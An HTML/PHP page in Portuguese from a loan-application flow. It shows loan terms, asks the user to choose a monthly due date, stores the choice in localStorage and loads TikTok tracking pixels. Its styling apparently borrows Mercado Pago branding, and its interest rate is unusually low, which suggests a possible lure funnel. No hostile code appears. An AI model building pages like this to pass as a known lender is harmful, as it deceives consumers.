<!DOCTYPE html>
<html lang="pt-BR">
<head>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vencimento</title>


<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  data-utmify-prevent-xcod-sck
  data-utmify-prevent-subids
  async
  defer
></script>
<script>
  window.tikTokPixelId = "6917a5ff97e4b1e2a6541a7a";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
  document.head.appendChild(a);
</script>
<!-- TikTok Pixel Code Start -->
<script>
!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};


  ttq.load('D4BQAE3C77UD6NKP6AK0');
  ttq.page();
}(window, document, 'ttq');
</script>
<!-- TikTok Pixel Code End -->



    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'mp-blue': '#009EE3',
                        'mp-dark-blue': '#0074A8',
                        'mp-light-blue': '#E6F7FF',
                    }
                }
            }
        }
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        * {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        main {
            flex: 1;
        }

        .fade-in {
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(15px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .btn-option {
            transition: all 0.2s ease;
        }

        .btn-option:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0, 158, 227, 0.2);
        }

        .btn-option:active {
            transform: translateY(0);
        }
    </style>
</head>
<body class="bg-gray-50">
    <?php include 'header.php'; ?>

    <main class="py-8 px-4 md:py-12">
        <div class="max-w-xl mx-auto">
            <div id="analise-secao" class="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8 fade-in">
                <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-6">Condições do empréstimo</h1>

                <div class="bg-mp-light-blue border-l-4 border-mp-blue rounded-lg p-5 mb-6">
                    <div class="flex gap-3">
                        <svg class="w-6 h-6 text-mp-blue flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"/>
                        </svg>
                        <div>
                            <div class="font-semibold text-gray-900 mb-2">Importante</div>
                            <div class="text-sm text-gray-700">
                                Se houver atraso no pagamento das parcelas, serão aplicados juros de 0,49% ao mês sobre o valor devido.
                            </div>
                        </div>
                    </div>
                </div>

                <div class="space-y-4 mb-6">
                    <div class="flex justify-between py-3 border-b border-gray-100">
                        <span class="text-gray-600">Taxa de juros</span>
                        <span class="font-semibold text-gray-900">0,49% a.m.</span>
                    </div>
                    <div class="flex justify-between py-3 border-b border-gray-100">
                        <span class="text-gray-600">Primeira parcela</span>
                        <span class="font-semibold text-gray-900">Janeiro/2026</span>
                    </div>
                    <div class="flex justify-between py-3">
                        <span class="text-gray-600">Prazo</span>
                        <span class="font-semibold text-gray-900" id="prazoTexto">Até 60 meses</span>
                    </div>
                </div>

                <button
                    onclick="mostrarPagina('vencimento-secao')"
                    class="w-full bg-mp-blue text-white py-3.5 rounded-lg font-semibold hover:bg-mp-dark-blue hover:shadow-lg transition-all"
                >
                    Concordo com as condições
                </button>
            </div>

            <div id="vencimento-secao" class="bg-white rounded-2xl shadow-sm border border-gray-100 p-6 md:p-8 hidden fade-in">
                <h1 class="text-2xl md:text-3xl font-bold text-gray-900 mb-2">Escolha o dia de vencimento</h1>
                <p class="text-gray-600 mb-8">
                    <span id="nomeCliente" class="font-semibold">Agora</span> escolha o melhor dia para pagar suas parcelas
                </p>

                <div class="space-y-3">
                    <button
                        onclick="selecionarVencimento(5)"
                        class="btn-option w-full bg-white border-2 border-gray-200 hover:border-mp-blue text-gray-900 py-4 rounded-lg font-semibold text-left px-6 flex items-center justify-between group"
                    >
                        <span>Dia 5 de cada mês</span>
                        <svg class="w-5 h-5 text-gray-400 group-hover:text-mp-blue transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
                        </svg>
                    </button>

                    <button
                        onclick="selecionarVencimento(10)"
                        class="btn-option w-full bg-white border-2 border-gray-200 hover:border-mp-blue text-gray-900 py-4 rounded-lg font-semibold text-left px-6 flex items-center justify-between group"
                    >
                        <span>Dia 10 de cada mês</span>
                        <svg class="w-5 h-5 text-gray-400 group-hover:text-mp-blue transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
                        </svg>
                    </button>

                    <button
                        onclick="selecionarVencimento(15)"
                        class="btn-option w-full bg-white border-2 border-gray-200 hover:border-mp-blue text-gray-900 py-4 rounded-lg font-semibold text-left px-6 flex items-center justify-between group"
                    >
                        <span>Dia 15 de cada mês</span>
                        <svg class="w-5 h-5 text-gray-400 group-hover:text-mp-blue transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
                        </svg>
                    </button>

                    <button
                        onclick="selecionarVencimento(25)"
                        class="btn-option w-full bg-white border-2 border-gray-200 hover:border-mp-blue text-gray-900 py-4 rounded-lg font-semibold text-left px-6 flex items-center justify-between group"
                    >
                        <span>Dia 25 de cada mês</span>
                        <svg class="w-5 h-5 text-gray-400 group-hover:text-mp-blue transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
                        </svg>
                    </button>

                    <button
                        onclick="selecionarVencimento(30)"
                        class="btn-option w-full bg-white border-2 border-gray-200 hover:border-mp-blue text-gray-900 py-4 rounded-lg font-semibold text-left px-6 flex items-center justify-between group"
                    >
                        <span>Dia 30 de cada mês</span>
                        <svg class="w-5 h-5 text-gray-400 group-hover:text-mp-blue transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/>
                        </svg>
                    </button>
                </div>
            </div>
        </div>
    </main>

    <?php include 'footer.php'; ?>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            try {
                const nome = localStorage.getItem('nome');
                if (nome) {
                    const primeiroNome = nome.split(' ')[0];
                    document.getElementById('nomeCliente').textContent = primeiroNome + ',';
                }

                const installments = localStorage.getItem('installments');
                if (installments) {
                    document.getElementById('prazoTexto').textContent = `Até ${installments} meses`;
                }
            } catch(e) {
                console.warn('localStorage error:', e);
            }
        });

        function mostrarPagina(paginaId) {
            document.getElementById('analise-secao').classList.add('hidden');
            document.getElementById('vencimento-secao').classList.add('hidden');
            document.getElementById(paginaId).classList.remove('hidden');
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        function selecionarVencimento(dia) {
            try {
                localStorage.setItem('vencimento', dia);
            } catch(e) {
                console.warn('localStorage error:', e);
            }
            const urlParams = new URLSearchParams(window.location.search);
            window.location.href = `5.php?${urlParams.toString()}`;
        }

        mostrarPagina('analise-secao');
    </script>
</body>
</html>
